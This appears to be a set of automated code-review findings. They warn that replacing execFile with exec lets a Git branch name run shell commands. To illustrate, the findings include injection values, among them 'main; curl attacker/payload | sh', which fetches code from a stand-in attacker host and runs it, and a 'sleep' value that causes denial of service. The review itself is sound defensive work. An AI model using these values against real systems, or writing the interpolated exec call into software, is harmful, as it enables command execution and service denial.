findings.title: [P1] Keep branch names out of the shell
findings.body: When `branch` contains shell metacharacters, such as `main; arbitrary-command`, `exec` interprets them and runs additional commands with the application's privileges. The previous `execFile` implementation passed the branch as a literal Git argument. Retain argv-based execution instead of interpolating the value into a shell command.

findings.title: [P1] Preserve argv-based execution so cancellation controls the actual Git process
findings.body:
Valid Git ref names may contain shell operators such as `;` or `&`. On POSIX, an input like `main;sh` starts an additional process, changes completion ordering, and makes `kill()` target the intermediary shell rather than reliably terminating all spawned work. This can leave calls hanging or descendants running after cancellation.

_Recommend validating this comment independently._

findings.title: [P1] Avoid passing the branch name through a shell
findings.body:
`exec()` interprets `branch` as shell syntax. On POSIX, input such as `main; arbitrary-command` executes that command with the process’s privileges; the previous `execFile()` implementation passed it as a literal Git argument.

_Recommend validating this comment independently._

findings.title: [P1] Avoid interpolating branch names into a shell command
findings.body:
`exec` invokes a shell, so an untrusted branch value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application's privileges. The previous `execFile` implementation passed the branch as a literal argument and was not vulnerable.

_Recommend validating this comment independently._

findings.title: [P1] Restore `execFile` to prevent branch names from spawning resource-consuming processes
findings.body:
`branch` is interpolated into a shell command. A valid Git branch name such as `foo;sleep${IFS}2147483647` launches `sleep` after `git show`, leaving the operation indefinitely active. Repeated untrusted inputs can exhaust process resources and deny service.

_Recommend validating this comment independently._
